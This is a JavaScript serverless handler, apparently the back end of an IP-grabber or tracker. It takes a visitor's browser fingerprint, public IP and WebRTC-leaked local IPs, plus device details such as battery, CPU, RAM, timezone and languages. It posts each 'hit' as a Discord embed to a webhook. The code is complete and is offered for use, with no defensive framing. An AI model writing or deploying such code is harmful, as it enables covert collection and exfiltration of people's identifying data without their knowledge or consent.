export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({error:'method'});
  
  const data = req.body || {};
  const publicIP = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'inconnu').split(',')[0].trim();

  const embed = {
    title: "🎯 NOUVEAU HIT",
    color: 0xff3333,
    fields: [
      { name: "🌐 IP publique", value: `\`${publicIP}\``, inline: true },
      { name: "🏠 IPs locales (WebRTC)", value: `\`${(data.localIPs || []).join(', ') || 'aucune'}\``, inline: true },
      { name: "🔐 Fingerprint hash", value: `\`${data.fingerprintHash || 'n/a'}\``, inline: false },
      { name: "📱 User-Agent", value: `\`${(data.userAgent||'').substring(0,250)}\``, inline: false },
      { name: "🖥️ Écran", value: data.screen || 'n/a', inline: true },
      { name: "🌍 Fuseau", value: data.timezone || 'n/a', inline: true },
      { name: "🗣️ Langues", value: data.languages || 'n/a', inline: true },
      { name: "⚙️ CPU / RAM", value: `${data.hardwareConcurrency} cores / ${data.deviceMemory} GB`, inline: true },
      { name: "🔋 Batterie", value: data.battery || 'n/a', inline: true },
      { name: "👆 Touch points", value: `${data.touchPoints}`, inline: true },
      { name: "📡 Connexion", value: data.connection || 'n/a', inline: false },
      { name: "🕐 Timestamp", value: data.timestamp || 'n/a', inline: false }
    ],
    footer: { text: "Famille Secu - hit auto" }
  };

  try {
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ embeds:[embed] })
    });
  } catch(e) {
    console.error('webhook error', e);
  }

  res.status(200).json({ ok: true });
}
